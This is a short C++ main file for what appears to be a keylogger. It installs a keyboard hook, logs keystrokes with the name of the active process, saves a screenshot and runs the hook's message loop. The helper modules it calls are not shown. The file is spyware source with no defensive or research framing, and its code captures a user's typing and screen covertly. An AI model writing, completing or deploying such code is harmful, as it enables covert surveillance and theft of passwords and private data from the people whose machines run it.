#include "stream.h"
#include "keyhook.h"
#include "screen.h"

int main() {
  stream::MakeDir(stream::GetPath());
  key_hook::InstallHook();

  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);

  screen::CaptureScreen(stream::GetPath() + "\\", "screen.jpeg");

  key_hook::HandleMessage(true);
  return 0;
}
